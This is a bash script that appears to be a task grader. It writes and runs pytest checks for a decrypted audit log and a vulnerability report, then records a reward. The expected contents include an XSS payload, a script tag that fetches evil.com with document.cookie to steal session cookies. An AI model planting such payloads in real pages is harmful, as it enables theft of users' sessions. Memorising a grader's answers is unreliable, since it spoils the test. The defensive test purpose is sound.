#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
# test_final_state.py

import os
import pytest

def test_decrypted_audit_exists_and_correct():
    path = '/home/user/decrypted_audit.txt'
    assert os.path.exists(path), f"File {path} is missing."
    assert os.path.isfile(path), f"Path {path} is not a file."

    expected_content = (
        "[INFO] Application started in sandbox mode.\n"
        "[INFO] User 'admin' authenticated successfully.\n"
        "[WARN] Invalid input detected in search field.\n"
        "[ERROR] Database query failed for input: <script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>\n"
        "[INFO] Session terminated.\n"
    )

    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()

    # Check if the content is correct (allowing for some whitespace differences at the end)
    assert content.strip() == expected_content.strip(), "The decrypted_audit.txt content does not match the expected original log."

def test_vulnerability_report_exists_and_correct():
    path = '/home/user/vulnerability_report.txt'
    assert os.path.exists(path), f"File {path} is missing."
    assert os.path.isfile(path), f"Path {path} is not a file."

    expected_payload = "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"

    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()

    assert content.strip() == expected_payload, "The vulnerability_report.txt does not contain the exact malicious payload."
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
